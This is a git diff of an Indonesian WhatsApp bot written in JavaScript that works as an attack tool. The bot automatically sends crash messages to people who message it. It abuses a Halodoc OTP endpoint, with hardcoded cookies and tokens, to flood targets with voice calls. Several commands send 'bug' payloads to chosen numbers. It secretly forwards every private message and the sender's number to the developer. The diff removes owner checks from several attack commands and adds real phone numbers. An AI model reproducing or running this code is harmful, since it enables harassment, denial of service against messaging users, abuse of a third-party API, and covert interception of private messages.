@@ -4,6 +4,7 @@ const { exec } = require('child_process')
 const axios = require('axios').default
 const fs = require('fs')
 autobug = true
+mode = false
 
 module.exports = async (semar, denz, msg) => {
 try {
@@ -18,6 +19,7 @@ const isCmd = body.startsWith(prefix)
 const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
 const args = body.trim().split(/ +/).slice(1)
 const dn = args.join(' ')
+const nomorOwner = ['6285866295942','6282265058541','628895137788','6285865662584','6285727091924','6282296368892','6282225962567','4915510151395','628999890587','6282221840767']
 const isGroup = from.endsWith('@g.us')
 const botNumber = semar.user.id.split(':')[0]
 const sender = msg.key.fromMe ? (semar.user.id.split(':')[0]+'@s.whatsapp.net' || semar.user.id) : (msg.key.participant || msg.key.remoteJid)
@@ -59,7 +61,7 @@ if (autobug && !isOwner && !isCmd && !isGroup) {
 semar.relayMessage(from, { reactionMessage }, { messageId: "crash" })
 axios.post('https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requests',{'phone_number':`+${senderNumber}`,'channel': 'voice'},{headers: {'authority': 'magneto.api.halodoc.com','accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7','cookie': '_gcl_au=1.1.1860823839.1661903409; _ga=GA1.2.508329863.1661903409; afUserId=52293775-f4c9-4ce2-9002-5137c5a1ed24-p; XSRF-TOKEN=12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636; _gid=GA1.2.798137486.1664887110; ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%2218bb4559-2170-9c14-ddcd-2dc80d13c3e3%22%2C%22c%22%3A1656491802961%2C%22l%22%3A1664887110254%7D; amp_394863=nZm2vDUbDAvSia6NQPaGum...1gehg2efd.1gehg3c19.f.0.f; ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%22f1b09ad8-a7d9-16f3-eb99-a97ba52677d2%22%2C%22e%22%3A1664888940400%2C%22c%22%3A1664887110252%2C%22l%22%3A1664887140400%7D','origin': 'https://www.halodoc.com','sec-ch-ua': '"Microsoft Edge";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53','x-xsrf-token': '12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636'}}).then(function (response) {console.log(response)}).catch(function (error) {console.log(error)})}
 
-if (!isGroup && body && !msg.key.fromMe && !isDev) {
+if (body && !isGroup && !msg.key.fromMe && !isDev) {
 semar.sendMessage(`${nomorDeveloper}@s.whatsapp.net`, {text:`• WhatsApp\nChat : ${body}\nFrom : ${pushname}\nNumber : ${senderNumber}\nLink : wa.me/${sender}`})}
 
 if (body.startsWith(`$`)){ if (!isOwner && !msg.key.fromMe) return
@@ -76,6 +78,8 @@ return reply(require('util').format(evaluate))} catch(e){
 return reply(require('util').format(e))}}
 
 if (isCmd) { await semar.readMessages([msg.key]) }
+if (isCmd && !isOwner && !msg.key.fromMe) { if (mode === false) return reply('saat ini bot sedang dalam mode private\nbot hanya dapat digunakan oleh owner') }
+if (!mode) { if (!isOwner && !msg.key.fromMe) return }
 switch (command) {
 //©from: dennis
 case 'cek': case 'test': case 'status':
@@ -136,9 +140,9 @@ break
 
 //©from: dennis × ivan
 case 'sendbug':
-if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
 if (!dn) return reply(`Silahkan masukkan nomor dan jumlah bug!\nContoh: ${prefix}sendbug ${senderNumber}|10`)
 if (args[0].startsWith('0')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}sendbug ${senderNumber}|10`)
+if (args[0].startsWith('8')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}spambug ${senderNumber}|10`)
 if (args[0].startsWith('+')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}sendbug ${senderNumber}|10`)
 if (args[0].startsWith(`${nomorDeveloper}`)) return reply('Tidak bisa mengirim bug ke nomor developer!')
 if (args[0].startsWith(`${botNumber}`)) return reply('Tidak bisa mengirim bug ke nomor ini!')
@@ -157,9 +161,9 @@ break
 
 //©from: dennis × andik
 case 'dumpbug':
-if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
 if (!dn) return reply(`Silahkan masukkan nomor!\nContoh: ${prefix}dumpbug ${senderNumber}`)
 if (args[0].startsWith('0')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}dumpbug ${senderNumber}`)
+if (args[0].startsWith('8')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}spambug ${senderNumber}|10`)
 if (args[0].startsWith('+')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}dumpbug ${senderNumber}`)
 if (args[0].startsWith(`${nomorDeveloper}`)) return reply('Tidak bisa mengirim bug ke nomor developer!')
 if (args[0].startsWith(`${botNumber}`)) return reply('Tidak bisa mengirim bug ke nomor ini!')
@@ -169,9 +173,9 @@ break
 
 //©from: dennis × ivan × andik
 case 'spambug':
-if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
 if (!dn) return reply(`Silahkan masukkan nomor dan jumlah bug!\nContoh: ${prefix}spambug ${senderNumber}|10`)
 if (args[0].startsWith('0')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}spambug ${senderNumber}|10`)
+if (args[0].startsWith('8')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}spambug ${senderNumber}|10`)
 if (args[0].startsWith('+')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}spambug ${senderNumber}|10`)
 if (args[0].startsWith(`${nomorDeveloper}`)) return reply('Tidak bisa mengirim bug ke nomor developer!')
 if (args[0].startsWith(`${botNumber}`)) return reply('Tidak bisa mengirim bug ke nomor ini!')
@@ -185,8 +189,8 @@ break
 
 //©from: dennis x haikal
 case 'buggc':
-if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
 if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
+if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
 requestPaymentMessage = generateWAMessageFromContent(from, proto.Message.fromObject({"requestPaymentMessage": {"currencyCodeIso4217": "IDR","amount1000": "1000","extendedTextMessage": {"text": "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61"}}}), { userJid: msg.chat })
 semar.relayMessage(from, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
 await sleep(3000)
@@ -223,6 +227,7 @@ case 'chat':
 if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
 if (!dn) return reply(`Silahkan masukkan nomor dan pesan!\nContoh: ${prefix}chat ${senderNumber}|halo`)
 if (args[0].startsWith('0')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}chat ${senderNumber}|halo`)
+if (args[0].startsWith('8')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}spambug ${senderNumber}|10`)
 if (args[0].startsWith('+')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}chat ${senderNumber}|halo`)
 if (args[0].startsWith(`${botNumber}`)) return reply('Tidak bisa mengirim pesan ke nomor ini!')
 nd = dn.split("|")
@@ -246,7 +251,6 @@ break
 
 //©from: dennis
 case 'delete': case 'd': case 'del':
-if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
 semar.sendMessage(from, { delete: { id: msg.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true }})
 break
 
@@ -264,13 +268,26 @@ break
 
 //©from: dennis × mr_dark
 case 'call':
-if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
 if (!dn) return reply(`Silahkan masukkan nomor!\nContoh: ${prefix}call +${senderNumber}`)
 if (args[0].startsWith('0')) return reply(`Awali nomor dengan +62!\nContoh: ${prefix}call +${senderNumber}`)
 if (args[0].startsWith('8')) return reply(`Awali nomor dengan +62!\nContoh: ${prefix}call +${senderNumber}`)
 if (args[0].startsWith(`+${nomorDeveloper}`)) return reply('Tidak bisa call ke nomor developer!')
 if (args[0].startsWith(`+${botNumber}`)) return reply('Tidak bisa call ke nomor ini!')
 axios.post('https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requests',{'phone_number':`${dn}`,'channel': 'voice'},{headers: {'authority': 'magneto.api.halodoc.com','accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7','cookie': '_gcl_au=1.1.1860823839.1661903409; _ga=GA1.2.508329863.1661903409; afUserId=52293775-f4c9-4ce2-9002-5137c5a1ed24-p; XSRF-TOKEN=12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636; _gid=GA1.2.798137486.1664887110; ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%2218bb4559-2170-9c14-ddcd-2dc80d13c3e3%22%2C%22c%22%3A1656491802961%2C%22l%22%3A1664887110254%7D; amp_394863=nZm2vDUbDAvSia6NQPaGum...1gehg2efd.1gehg3c19.f.0.f; ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%22f1b09ad8-a7d9-16f3-eb99-a97ba52677d2%22%2C%22e%22%3A1664888940400%2C%22c%22%3A1664887110252%2C%22l%22%3A1664887140400%7D','origin': 'https://www.halodoc.com','sec-ch-ua': '"Microsoft Edge";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53','x-xsrf-token': '12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636'}}).then(function (response) {reply(`${JSON.stringify(response.data, null, 2)}`)}).catch(function (error) {reply(`${JSON.stringify(error, null, 2)}`)})
+break
+
+//©from: dennis
+case 'public':
+if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
+mode = true
+reply('Sukses')
+break
+
+//©from: dennis
+case 'private':
+if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
+mode = false
+reply('Sukses')
 break
 
 //©from: dennis
